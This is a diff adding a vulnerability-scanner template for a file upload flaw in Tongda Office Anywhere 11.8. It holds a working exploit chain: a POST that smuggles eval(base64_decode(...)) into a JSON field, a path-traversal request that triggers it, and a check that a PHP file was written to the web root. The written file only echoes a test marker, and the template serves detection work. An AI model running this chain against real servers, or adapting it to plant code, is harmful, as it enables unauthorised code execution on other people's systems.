@@ -1,0 +1,59 @@
+id: tongda-office-anywhere-11.8-file-upload
+info:
+  name: Tongda Office Anywhere 11.8 API File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    This template detects a file upload vulnerability in Tongda Office Anywhere 11.8 via the /mobile/api/api.ali.php endpoint.
+
+variables:
+  t1: '{{date_time("0601")}}'
+  filename: '{{rand_base(6)}}'
+
+flow: http(1) && http(2) && http(3)
+
+http:
+  - id: file-upload
+    method: POST
+    path:
+      - '{{BaseURL}}/mobile/api/api.ali.php'
+    headers:
+      Content-Type: multipart/form-data; boundary=c95f01744a86a8923cdf0e2b538a850d
+    body: |-
+      --c95f01744a86a8923cdf0e2b538a850d
+      Content-Disposition: form-data; name="file"; filename="{{filename}}.json"
+      Content-Type: application/octet-stream
+
+      {"modular":"AllVariable","dotast":"ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2RvdGFzdC5waHAnLCc8P3BocCBlY2hvICIhISEhIXZ1bG5lcmFiaWxpdHkgdGVzdCB3YXMgc3VjY2Vzc2Z1bEBAQEBAIjs/PicpOw==","dataAnalysis":"{\"abc\":\"覾',eval(base64_decode($BackData[dotast])));/*\"}"
+      --c95f01744a86a8923cdf0e2b538a850d--
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: verify-upload
+    method: GET
+    path:
+      - '{{BaseURL}}/inc/package/work.php?id=../../../../../myoa/attach/approve_center/{{t1}}/%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E.{{filename}}'
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "+OK"
+
+  - id: verify-execution
+    method: GET
+    path:
+      - '{{BaseURL}}/dotast.php'
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "!!!!!vulnerability test was successful@@@@@"
